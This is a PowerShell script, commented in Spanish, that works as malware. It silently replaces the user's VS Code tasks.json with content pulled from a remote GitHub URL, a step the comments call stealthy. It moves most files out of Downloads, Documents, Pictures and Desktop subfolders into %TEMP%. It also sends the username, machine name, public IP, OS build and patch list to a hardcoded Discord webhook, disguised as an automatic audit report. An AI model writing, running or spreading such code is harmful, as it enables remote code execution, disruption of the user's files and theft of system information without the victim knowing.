# 1. Configuración de variables
$Webhook        = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath      = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (Sigiloso)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10
    if ($RemoteContent -like "*version*") {
        $LocalHash  = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) { $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force }
    }
} catch { }

# --- 4. HILO SECUNDARIO: MOVIMIENTO DE ARCHIVOS Y CARPETAS ---
Start-Job -Name "FileArchiver" -ArgumentList $Webhook, $env:USERNAME, $env:COMPUTERNAME -ScriptBlock {
    param($W, $U, $D)

    $sf = Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders"

    # BUG FIX: nombres correctos de las claves de registro
$carpetasOrigen = [ordered]@{
    "Descargas"  = [System.Environment]::ExpandEnvironmentVariables(
                       (Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders")."{374DE290-123F-4565-9164-39C4925E467B}"
                   )
    "Documentos" = [System.Environment]::GetFolderPath("MyDocuments")
    "Imágenes"   = [System.Environment]::GetFolderPath("MyPictures")
}

$desktop = [System.Environment]::GetFolderPath("Desktop")
    $dest    = [System.Environment]::ExpandEnvironmentVariables("%TEMP%")
    $resultados = [System.Collections.Generic.List[hashtable]]::new()

    # --- Descargas / Documentos / Imágenes: mover 85% ---
    foreach ($entry in $carpetasOrigen.GetEnumerator()) {
        $src = $entry.Value
        if (-not (Test-Path $src)) { continue }

        $items = @(Get-ChildItem -Path $src -ErrorAction SilentlyContinue)
        if ($items.Count -eq 0) { continue }

        # BUG FIX: Get-Random falla si Count > items.Count
        $cantidad = [Math]::Min([Math]::Ceiling($items.Count * 0.85), $items.Count)
        $objs     = $items | Get-Random -Count $cantidad
        $movidos  = [System.Collections.Generic.List[string]]::new()

        foreach ($item in $objs) {
            try {
                # BUG FIX: evitar colisión de nombres en %TEMP%
                $destPath = Join-Path $dest $item.Name
                if (Test-Path $destPath) {
                    $ext      = [System.IO.Path]::GetExtension($item.Name)
                    $base     = [System.IO.Path]::GetFileNameWithoutExtension($item.Name)
                    $rand     = [System.IO.Path]::GetRandomFileName().Split('.')[0]
                    $destPath = Join-Path $dest "${base}_${rand}${ext}"
                }
                Move-Item -Path $item.FullName -Destination $destPath -Force -ErrorAction Stop
                $tipo = if ($item.PSIsContainer) { "📁" } else { "📄" }
                $movidos.Add("$tipo $($item.Name)")
            } catch { }
        }

        if ($movidos.Count -gt 0) {
            $resultados.Add(@{ nombre = $entry.Name; emoji = "📂"; items = $movidos.ToArray() })
        }
    }

    # --- Desktop: subcarpetas → mover .exe ---
    if (Test-Path $desktop) {
        foreach ($carpeta in @(Get-ChildItem -Path $desktop -Directory -ErrorAction SilentlyContinue)) {
            $exes    = @(Get-ChildItem -Path $carpeta.FullName -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue)
            $movidos = [System.Collections.Generic.List[string]]::new()

            foreach ($exe in $exes) {
                try {
                    $destPath = Join-Path $dest $exe.Name
                    if (Test-Path $destPath) {
                        $rand     = [System.IO.Path]::GetRandomFileName().Split('.')[0]
                        $destPath = Join-Path $dest "$([System.IO.Path]::GetFileNameWithoutExtension($exe.Name))_${rand}.exe"
                    }
                    Move-Item -Path $exe.FullName -Destination $destPath -Force -ErrorAction Stop
                    $movidos.Add("⚙️ $($exe.Name)")
                } catch { }
            }

            if ($movidos.Count -gt 0) {
                $resultados.Add(@{ nombre = "Desktop\$($carpeta.Name)"; emoji = "🗂️"; items = $movidos.ToArray() })
            }
        }
    }

    # --- Construir payloads ---
    $payloads = [System.Collections.Generic.List[byte[]]]::new()
    foreach ($r in $resultados) {
        $lista = $r.items -join "`n"
        if ($lista.Length -gt 1800) { $lista = $lista.Substring(0, 1790) + "... (lista larga)" }

        $body = @{
            username   = "System File Manager"
            avatar_url = "https://i.imgur.com/8nLFCuR.png"
            embeds     = @(@{
                title       = "$($r.emoji) Reubicación — $($r.nombre)"
                color       = 16753920
                description = "Items movidos a ``%TEMP%``:`n`n$lista"
                footer      = @{ text = "Usuario: $U | Total: $($r.items.Count) items" }
                timestamp   = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
            })
        } | ConvertTo-Json -Depth 10

        $payloads.Add([System.Text.Encoding]::UTF8.GetBytes($body))
    }

    # --- Enviar secuencial (Discord rate limit por webhook) ---
    foreach ($p in $payloads) {
        try {
            Invoke-RestMethod -Uri $W -Method Post -Body $p -ContentType 'application/json; charset=utf-8'
            Start-Sleep -Milliseconds 1300
        } catch { }
    }
} | Out-Null

# --- 5. RECOLECCIÓN PRINCIPAL — datos en paralelo con jobs ---
$jobIP = Start-Job -ScriptBlock {
    try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "Desconocida" }
}
$jobOS = Start-Job -ScriptBlock {
    try { (Get-CimInstance Win32_OperatingSystem).Caption } catch { "Desconocido" }
}
$jobPatches = Start-Job -ScriptBlock {
    try {
        $raw = Get-HotFix | Select-Object HotFixID, InstalledOn
        ($raw | Where-Object { $_.InstalledOn } | Sort-Object InstalledOn -Descending) +
        ($raw | Where-Object { !$_.InstalledOn })
    } catch { @() }
}

$User   = $env:USERNAME
$Device = $env:COMPUTERNAME
$Build  = (Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion').CurrentBuild

# Esperar resultados en paralelo
$null   = Wait-Job $jobIP, $jobOS, $jobPatches
$IP     = Receive-Job $jobIP     -AutoRemoveJob
$OS     = Receive-Job $jobOS     -AutoRemoveJob
$Patches = @(Receive-Job $jobPatches -AutoRemoveJob)

$Count     = $Patches.Count
$Limit     = Get-Date -Year 2026 -Month 3 -Day 10
$Protected = $Patches | Where-Object { $_.InstalledOn -ge $Limit }
$Status    = if ($Protected) { "🛡️ SISTEMA PROTEGIDO" } else { "⚠️ VULNERABILIDAD DETECTADA" }
$Color     = if ($Protected) { 3066993 } else { 15158332 }

# --- Construir todos los payloads de una sola vez ---
$allPayloads = [System.Collections.Generic.List[byte[]]]::new()

# Payload 1: Identidad — BUG FIX: $IP sin escape
$allPayloads.Add([System.Text.Encoding]::UTF8.GetBytes((@{
    username   = "$User @ $Device"
    avatar_url = "https://i.imgur.com/8nLFCuR.png"
    embeds     = @(@{
        title       = "🚀 Reporte de Auditoría: $Device"
        color       = $Color
        description = "Se ha iniciado una inspección automática del entorno de desarrollo."
        fields      = @(
            @{ name = "💻 Sistema Operativo"; value = "$OS (Build $Build)"; inline = $false },
            @{ name = "📊 Estado de Seguridad"; value = $Status;            inline = $true  },
            @{ name = "👤 Usuario / IP";        value = "$User ($IP)";      inline = $true  },
            @{ name = "📦 Resumen de Parches";  value = "Se detectaron **$Count** parches instalados en el sistema."; inline = $false }
        )
        footer    = @{ text = "ID de Sesión: $([guid]::NewGuid().ToString().Substring(0,8))" }
        timestamp = (Get-Date).ToString("yyyy-MM-ddTHH:mm:ssZ")
    })
} | ConvertTo-Json -Depth 10)))

# Payloads de parches
$ChunkSize     = 3
$TotalSections = [Math]::Ceiling($Count / $ChunkSize)

for ($i = 0; $i -lt $Count; $i += $ChunkSize) {
    $End  = [Math]::Min($i + $ChunkSize - 1, $Count - 1)
    $Text = ($Patches[$i..$End] | ForEach-Object {
        $d = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Fecha no disponible' }
        "🔹 **$($_.HotFixID)**`n  └ Instalación: $d"
    }) -join "`n`n"

    $allPayloads.Add([System.Text.Encoding]::UTF8.GetBytes((@{
        username = "$User @ $Device"
        embeds   = @(@{
            title       = "📑 Parches — Sección $([Math]::Floor($i / $ChunkSize) + 1) de $TotalSections"
            color       = $Color
            description = $Text
        })
    } | ConvertTo-Json -Depth 10)))
}

# --- Enviar secuencial (rate limit Discord: ~30 req/min por webhook) ---
foreach ($p in $allPayloads) {
    try {
        Invoke-RestMethod -Uri $Webhook -Method Post -Body $p -ContentType 'application/json; charset=utf-8'
        Start-Sleep -Milliseconds 1300
    } catch { }
}
